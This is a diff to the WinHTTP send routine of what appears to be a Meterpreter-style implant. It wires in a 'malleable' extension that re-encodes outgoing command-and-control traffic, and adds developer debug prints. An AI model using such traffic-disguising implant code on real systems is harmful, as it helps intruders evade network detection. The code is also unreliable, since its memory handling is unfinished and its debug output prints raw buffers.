@@ -209,36 +209,48 @@ static BOOL read_response_winhttp(HANDLE hReq, LPVOID buffer, DWORD bytesToRead,
 
 static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, LPVOID buffer, DWORD size)
 {	
+	dprintf("[TIMOTRANSPORTWINHTTP] Buffer check on entry: %s", buffer);
 	// Check if malleable loaded
 	char* malleableTestCommand = "malleable_encode";
 	Command* malleableTestPointer = command_locate_extension(malleableTestCommand);
-	char* resultCharMalleable;
+	
 	dprintf("[TIMOTRANSPORTWINHTTP] Checking if malleable is loaded: %s", malleableTestPointer);
 	if (buffer != NULL && malleableTestPointer != NULL){
 		// if malleable is loaded AND the we have something buffer we encode in the the request handler
-		dprintf("[TIMOAAA] Working with request handler: %x", malleableTestPointer->request.malleableHandler);
-		resultCharMalleable = malleableTestPointer->request.malleableHandler(buffer, size);
+		//dprintf("[TIMOAAA] Working with request handler: %x", malleableTestPointer->request.malleableHandler);
+		dprintf("[TIMOTRANSPORTWINHTTP] Getting handler");
+		char* resultCharMalleable = malleableTestPointer->request.malleableHandler(buffer, size);
+
+		dprintf("[TIMOAAA] Done working with request handler. Result char att: %x ", resultCharMalleable);
 		if (resultCharMalleable != NULL){
+			
 			dprintf("[TIMOTRANSPORTWINHTTP] resultPointer != NULL");
 			size = (DWORD)strlen(resultCharMalleable) + 1;
 			free(buffer);
-			malloc(strlen(resultCharMalleable) + 1);
+			buffer = (char*)malloc(strlen(resultCharMalleable) + 1);
+			
 			/* Note that strncpy is unnecessary here since you know both the size
 			* of the source and destination buffers
 			*/
-			strcpy(buffer, resultCharMalleable);
+			strcpy(buffer, resultCharMalleable); // do i need to free the resultcharmalleable?
+			
+			//free(resultCharMalleable);
+			//free(malleableTestPointer);
+			//free(malleableTestCommand);
+			
 		}
 		else{
-			dprintf("[TIMOTRANSPORTWINHTTP] resultPointer == NULL THIS SHOULD NEVER HAPPEN!!!!");
+			dprintf("[TIMOTRANSPORTWINHTTP] resultPointer == NULL THIS SHOULD SOMETIMES (in case of no LUA script set(which is not set by default )) HAPPEN!!!!");
 		}
-		dprintf("[TIMOAAA] Done working with request handler. Result char add: %x ", resultCharMalleable);
+		
 	}
 	else{
 		dprintf("[TIMOTRANSPORTWINHTTP] Malleable NOT loaded or Buffer null");
 	}
+	
 	/*char* timoTest = "halloTimo";
 	buffer = _strdup(timoTest);*/
-
+	dprintf("[TIMOTRANSPORTWINHTTP] About to send out buffer: %s", buffer);
 	// do we need to free pointer? TIMO
 
 	if (ctx->custom_headers)
